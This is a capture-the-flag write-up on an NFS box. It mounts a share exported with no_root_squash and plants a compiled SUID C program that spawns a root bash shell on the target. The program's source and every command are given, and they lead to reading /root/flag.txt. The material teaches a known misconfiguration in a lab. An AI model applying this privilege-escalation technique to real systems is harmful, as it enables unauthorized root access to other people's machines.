### Question 1 — What is the full path of the mountable share?


A single share, `/opt/nfs`, exported to any host (`*`), read-write, with `no_root_squash`.  Confirmed it from the attacking machine:

### Question 2 — What are the contents of /root/flag.txt?

Mounted the share locally:

```shell

└─$ mkdir /tmp/nfs 

┌──(—REDACTED—㉿kali)-[~]
└─$ cd /tmp/nfs

└─$ sudo mount -o rw 10.114.180.122:/opt/nfs /tmp/nfs

[sudo] password for —REDACTED—: 
```

**Breakdown:**

- `mkdir /tmp/nfs` creates a local mount point
- `sudo mount -o rw 10.114.180.122:/opt/nfs /tmp/nfs` mounts the target's `/opt/nfs` share onto it, read-write

A quick look at what was already there:

```shell
┌──(—REDACTED—㉿kali)-[/tmp/nfs]
└─$ ls

todo.txt

┌──(—REDACTED—㉿kali)-[/tmp/nfs]
└─$ cat todo.txt             

Fix nfs permissions, someone might just get root.   
```

A note left on the share effectively confirming the misconfiguration before even exploiting it. Wrote a SUID shell source directly onto the mounted share:

```shell
┌──(—REDACTED—㉿kali)-[/tmp/nfs]
└─$ sudo vim shell.c                    

┌──(—REDACTED—㉿kali)-[/tmp/nfs]
└─$ cat shell.c

#include<unistd.h>
#include<stdlib.h>
int main() {
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
}
```

Compiled and set the SUID bit, both run as root via `sudo` so the resulting file stays root-owned once it lands on the target:

```shell
┌──(—REDACTED—㉿kali)-[/tmp/nfs]
└─$ sudo gcc shell.c -o shell -w -static
                                                                                                                                                                                                                                            
┌──(—REDACTED—㉿kali)-[/tmp/nfs]
└─$ sudo chmod +s shell
                                                                                                                                                                                                                                            
┌──(—REDACTED—㉿kali)-[/tmp/nfs]
└─$ ls -la                                                                  

total 776
drwxr-xr-x  2 root root   4096 Nov 12 11:47 .
drwxrwxrwt 13 root root    320 Nov 12 11:47 ..
-rwsr-sr-x  1 root root 779680 Nov 12 11:47 shell
-rw-r--r--  1 root root    110 Nov 12 11:46 shell.c
-rw-r--r--  1 root root     49 Mar  3  2026 todo.txt
```

**Breakdown:**

- `sudo gcc shell.c -o shell -w -static` compiles `shell.c` into `shell`, statically linked, with warnings suppressed, run as root so the output file is root-owned
- `sudo chmod +s shell` sets the SUID (and SGID) bit, likewise run as root
- `ls -la` confirms `shell` carries `-rwsr-sr-x` and is owned by `root:root`

Switched to the target and ran the binary from its side of the share:

```shell
john@nfs-box:~$ cd /opt/nfs

john@nfs-box:/opt/nfs$ ls

shell  shell.c  todo.txt
john@nfs-box:/opt/nfs$ ./shell

root@nfs-box:/opt/nfs# 
```

The prompt change to `root@nfs-box:/opt/nfs#` confirmed the escalation.`no_root_squash` preserved `shell`'s root ownership and SUID bit across the share, so running it as `john` still ran it with root's privileges. From there:

```shell
root@nfs-box:/opt/nfs# cat /root/flag.txt

—REDACTED—
```

**Answer:** `—REDACTED—`
